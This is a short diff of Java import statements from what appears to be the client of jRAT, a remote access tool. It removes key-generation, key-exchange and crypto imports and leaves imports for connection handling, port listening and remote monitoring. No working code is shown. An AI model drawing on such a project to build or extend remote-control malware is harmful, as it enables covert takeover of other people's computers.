@@ -8,11 +8,8 @@ import java.util.Arrays;
 import java.util.List;
 
 import javax.crypto.BadPaddingException;
-import javax.crypto.KeyGenerator;
-import javax.crypto.SecretKey;
 
 import se.jrat.client.addons.PluginEventHandler;
-import se.jrat.client.crypto.GlobalKeyPair;
 import se.jrat.client.exceptions.CloseException;
 import se.jrat.client.net.ConnectionHandler;
 import se.jrat.client.net.PortListener;
@@ -23,9 +20,6 @@ import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.ui.panels.PanelMainLog;
 import se.jrat.client.utils.TrayIconUtils;
 import se.jrat.client.utils.Utils;
-import se.jrat.common.codec.Hex;
-import se.jrat.common.crypto.Crypto;
-import se.jrat.common.crypto.KeyExchanger;
 import se.jrat.common.hash.Sha1;
 
 import com.redpois0n.graphs.monitors.RemoteMonitor;
